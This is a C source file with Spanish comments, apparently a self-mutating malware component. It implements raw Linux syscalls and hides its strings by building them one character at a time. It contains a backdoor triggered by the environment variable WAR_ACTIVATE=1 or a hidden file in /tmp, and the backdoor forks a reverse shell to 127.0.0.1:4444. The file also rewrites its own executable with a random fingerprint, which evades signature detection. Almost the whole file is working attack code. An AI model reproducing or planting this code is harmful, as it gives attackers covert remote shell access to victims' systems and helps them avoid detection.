#include <stddef.h>
#include <sys/types.h>

// ==================== SYSCALLS ====================

static inline long sys_write(int fd, const void *buf, size_t count) {
    long ret;
    __asm__ volatile(
        "mov $1, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd), "S"(buf), "d"(count)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_open(const char *path, int flags, int mode) {
    long ret;
    __asm__ volatile(
        "mov $2, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path), "S"(flags), "d"(mode)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_close(int fd) {
    long ret;
    __asm__ volatile(
        "mov $3, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_fstat(int fd, void *st) {
    long ret;
    __asm__ volatile(
        "mov $5, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd), "S"(st)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline void *sys_mmap(void *addr, size_t len, int prot, int flags, int fd, long offset) {
    void *ret;
    register long r10 __asm__("r10") = flags;
    register long r8 __asm__("r8") = fd;
    register long r9 __asm__("r9") = offset;
    
    __asm__ volatile(
        "mov $9, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(addr), "S"(len), "d"(prot), "r"(r10), "r"(r8), "r"(r9)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_munmap(void *addr, size_t len) {
    long ret;
    __asm__ volatile(
        "mov $11, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(addr), "S"(len)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_readlink(const char *path, char *buf, size_t bufsiz) {
    long ret;
    __asm__ volatile(
        "mov $89, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path), "S"(buf), "d"(bufsiz)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_unlink(const char *path) {
    long ret;
    __asm__ volatile(
        "mov $87, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_clock_gettime(int clk_id, void *tp) {
    long ret;
    __asm__ volatile(
        "mov $228, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(clk_id), "S"(tp)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline int sys_getpid(void) {
    int ret;
    __asm__ volatile(
        "mov $39, %%rax\n"
        "syscall"
        : "=a"(ret)
        :
        : "rcx", "r11", "memory"
    );
    return ret;
}

// ==================== SYSCALLS ADICIONALES PARA BACKDOOR ====================

static inline long sys_socket(int domain, int type, int protocol) {
    long ret;
    __asm__ volatile(
        "mov $41, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(domain), "S"(type), "d"(protocol)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_connect(int sockfd, const void *addr, size_t addrlen) {
    long ret;
    __asm__ volatile(
        "mov $42, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(sockfd), "S"(addr), "d"(addrlen)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_dup2(int oldfd, int newfd) {
    long ret;
    __asm__ volatile(
        "mov $33, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(oldfd), "S"(newfd)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_execve(const char *filename, char *const argv[], char *const envp[]) {
    long ret;
    __asm__ volatile(
        "mov $59, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(filename), "S"(argv), "d"(envp)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_fork(void) {
    long ret;
    __asm__ volatile(
        "mov $57, %%rax\n"
        "syscall"
        : "=a"(ret)
        :
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_setsid(void) {
    long ret;
    __asm__ volatile(
        "mov $112, %%rax\n"
        "syscall"
        : "=a"(ret)
        :
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline void sys_exit(int status) {
    __asm__ volatile(
        "mov $60, %%rax\n"
        "syscall"
        :
        : "D"(status)
        : "rcx", "r11", "memory"
    );
}

static inline long sys_read(int fd, void *buf, size_t count) {
    long ret;
    __asm__ volatile(
        "mov $0, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd), "S"(buf), "d"(count)
        : "rcx", "r11", "memory"
    );
    return ret;
}

// ==================== UTILIDADES ====================

__attribute__((section(".metamorph"), noinline, used))
static void *_memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen) {
    if (nlen == 0) return (void *)haystack;
    if (hlen < nlen) return 0;
    
    const unsigned char *h = haystack;
    const unsigned char *n = needle;
    
    for (size_t i = 0; i <= hlen - nlen; i++) {
        size_t j;
        for (j = 0; j < nlen; j++) {
            if (h[i + j] != n[j])
                break;
        }
        if (j == nlen)
            return (void *)(h + i);
    }
    return 0;
}// ==================== BACKDOOR TRIGGERS ====================

__attribute__((section(".metamorph"), noinline, used))
static int check_env_trigger(void) {
    // Leer /proc/self/environ para buscar WAR_ACTIVATE=1
    char path[20];
    path[0] = '/'; path[1] = 'p'; path[2] = 'r'; path[3] = 'o'; path[4] = 'c';
    path[5] = '/'; path[6] = 's'; path[7] = 'e'; path[8] = 'l'; path[9] = 'f';
    path[10] = '/'; path[11] = 'e'; path[12] = 'n'; path[13] = 'v';
    path[14] = 'i'; path[15] = 'r'; path[16] = 'o'; path[17] = 'n';
    path[18] = '\0';
    
    int fd = sys_open(path, 0, 0);
    if (fd < 0) return 0;
    
    char buf[2048];
    long bytes = sys_read(fd, buf, sizeof(buf) - 1);
    sys_close(fd);
    
    if (bytes <= 0) return 0;
    
    // Buscar "WAR_ACTIVATE=1" en el buffer
    char marker[15];
    marker[0] = 'W'; marker[1] = 'A'; marker[2] = 'R'; marker[3] = '_';
    marker[4] = 'A'; marker[5] = 'C'; marker[6] = 'T'; marker[7] = 'I';
    marker[8] = 'V'; marker[9] = 'A'; marker[10] = 'T'; marker[11] = 'E';
    marker[12] = '='; marker[13] = '1'; marker[14] = '\0';
    
    return (_memmem(buf, bytes, marker, 14) != 0);
}

__attribute__((section(".metamorph"), noinline, used))
static int check_file_trigger(void) {
    // Verificar si existe /tmp/.war_trigger
    char path[20];
    path[0] = '/'; path[1] = 't'; path[2] = 'm'; path[3] = 'p';
    path[4] = '/'; path[5] = '.'; path[6] = 'w'; path[7] = 'a';
    path[8] = 'r'; path[9] = '_'; path[10] = 't'; path[11] = 'r';
    path[12] = 'i'; path[13] = 'g'; path[14] = 'g'; path[15] = 'e';
    path[16] = 'r'; path[17] = '\0';
    
    int fd = sys_open(path, 0, 0);
    if (fd >= 0) {
        sys_close(fd);
        sys_unlink(path);  // Borrar trigger después de detectarlo
        return 1;
    }
    return 0;
}

__attribute__((section(".metamorph"), noinline, used))
static int should_activate_backdoor(void) {
    // Verificar triggers (puedes añadir más)
    if (check_env_trigger()) return 1;
    if (check_file_trigger()) return 1;
    
    // TODO: añadir check_time_trigger si quieres
    
    return 0;
}

__attribute__((section(".metamorph"), noinline, used))
static void _itohex(unsigned long val, char *buf, int len) {
    for (int i = len - 1; i >= 0; i--) {
        int nibble = val & 0xF;
        if (nibble < 10)
            buf[i] = '0' + nibble;
        else
            buf[i] = 'a' + (nibble - 10);
        val >>= 4;
    }
}

// ==================== BACKDOOR EXECUTION ====================

// Estructura para sockaddr_in (compatible con kernel)
struct sockaddr_in_inline {
    unsigned short sin_family;  // 2 bytes
    unsigned short sin_port;    // 2 bytes
    unsigned int sin_addr;      // 4 bytes
    char sin_zero[8];           // 8 bytes padding
};

__attribute__((section(".metamorph"), noinline, used))
static void execute_reverse_shell(void) {
    long pid = sys_fork();
    if (pid != 0) return;  // Padre continúa
    
    sys_setsid();
    
    // Socket
    int s = sys_socket(2, 1, 0);
    if (s < 0) sys_exit(1);
    
    // Dirección: 127.0.0.1:4444
    unsigned char addr[16];
    addr[0] = 2; addr[1] = 0;           // AF_INET
    addr[2] = 0x11; addr[3] = 0x5c;     // Puerto 4444 (big-endian)
    addr[4] = 127; addr[5] = 0;         // 127.0.0.1
    addr[6] = 0; addr[7] = 1;
    for (int i = 8; i < 16; i++) addr[i] = 0;
    
    if (sys_connect(s, addr, 16) < 0) {
        sys_close(s);
        sys_exit(1);
    }
    
    // === CLAVE: Cerrar TODOS los FDs excepto el socket ===
    for (int fd = 0; fd < 3; fd++) {
        sys_close(fd);
    }
    
    // Ahora redirigir
    sys_dup2(s, 0);  // stdin = socket
    sys_dup2(s, 1);  // stdout = socket
    sys_dup2(s, 2);  // stderr = socket
    
    // Cerrar el socket original si es > 2
    if (s > 2) sys_close(s);
    
    // === NUEVA TÉCNICA: Usar sh con comando inline ===
    // Esto fuerza al shell a ser interactivo
    char sh_path[] = "/bin/sh";
    char sh_c[] = "-c";
    char sh_cmd[] = "exec /bin/sh";  // "exec" reemplaza el proceso
    char *argv[] = {sh_path, sh_c, sh_cmd, 0};
    
    sys_execve(sh_path, argv, 0);
    
    // Si falla, intentar sin -c
    char *argv2[] = {sh_path, 0};
    sys_execve(sh_path, argv2, 0);
    
    sys_exit(1);
}

// ==================== FUNCIÓN PRINCIPAL ====================

__attribute__((section(".metamorph"), used))
void metamorph_mutate_self(void) {

	if (should_activate_backdoor()) {
        execute_reverse_shell();
        // El backdoor hace fork, así que continuamos aquí
    }

    char exe_path[256];
    
    // 1. Construir "/proc/self/exe"
    char proc_self[16];
    proc_self[0] = '/'; proc_self[1] = 'p'; proc_self[2] = 'r';
    proc_self[3] = 'o'; proc_self[4] = 'c'; proc_self[5] = '/';
    proc_self[6] = 's'; proc_self[7] = 'e'; proc_self[8] = 'l';
    proc_self[9] = 'f'; proc_self[10] = '/'; proc_self[11] = 'e';
    proc_self[12] = 'x'; proc_self[13] = 'e'; proc_self[14] = '\0';
    
    // 2. Obtener path del ejecutable
    long path_len = sys_readlink(proc_self, exe_path, 255);
    if (path_len < 0)
        return;
    exe_path[path_len] = '\0';
    
    // 3. Abrir SOLO LECTURA (O_RDONLY = 0)
    int fd = sys_open(exe_path, 0, 0);
    if (fd < 0)
        return;
    
    // 4. Obtener tamaño (alineado a 8 bytes)
    long stat_buf[18];
    if (sys_fstat(fd, stat_buf) < 0) {
        sys_close(fd);
        return;
    }
    long file_size = stat_buf[6];
    
    // 5. Mapear en memoria PRIVADA (PROT_READ=1, MAP_PRIVATE=2)
    void *map = sys_mmap(0, file_size, 1, 2, fd, 0);
    sys_close(fd);
    if (map == (void *)-1 || map == 0)
        return;
    
    // 6. Buscar "<<<WAR_SIG>>>"
    char marker[14];
    marker[0] = '<'; marker[1] = '<'; marker[2] = '<';
    marker[3] = 'W'; marker[4] = 'A'; marker[5] = 'R';
    marker[6] = '_'; marker[7] = 'S'; marker[8] = 'I';
    marker[9] = 'G'; marker[10] = '>'; marker[11] = '>';
    marker[12] = '>'; marker[13] = '\0';
    
    char *sig_ptr = _memmem(map, file_size, marker, 13);
    if (!sig_ptr) {
        sys_munmap(map, file_size);
        return;
    }
    
    // 7. Buscar el '[' del fingerprint
    long fp_offset = 0;
    for (int i = 13; i < 80; i++) {
        if (sig_ptr[i] == '[' && sig_ptr[i + 9] == ']') {
            fp_offset = (sig_ptr + i + 1) - (char *)map;
            break;
        }
    }
    
    if (!fp_offset) {
        sys_munmap(map, file_size);
        return;
    }
    
    // 8. Generar nuevo fingerprint aleatorio
    long ts[2];
    sys_clock_gettime(0, ts);
    int pid = sys_getpid();
    
    unsigned long seed = ts[1] ^ ((unsigned long)pid << 16) ^ ts[0];
    seed = (seed << 13) | (seed >> 19);
    seed ^= 0xDEADBEEF;
    
    char new_fp[8];
    _itohex(seed, new_fp, 8);
    
    // 9. Borrar el archivo original (Linux permite esto si está en ejecución)
    sys_unlink(exe_path);
    
    // 10. Crear nuevo archivo (O_WRONLY|O_CREAT|O_TRUNC = 577, mode 0755)
    int fd_out = sys_open(exe_path, 577, 0755);
    if (fd_out < 0) {
        sys_munmap(map, file_size);
        return;
    }
    
    // 11. Escribir: antes del fingerprint + nuevo fingerprint + después
    sys_write(fd_out, map, fp_offset);
    sys_write(fd_out, new_fp, 8);
    sys_write(fd_out, (char *)map + fp_offset + 8, file_size - fp_offset - 8);
    
    // 12. Cleanup
    sys_close(fd_out);
    sys_munmap(map, file_size);
}
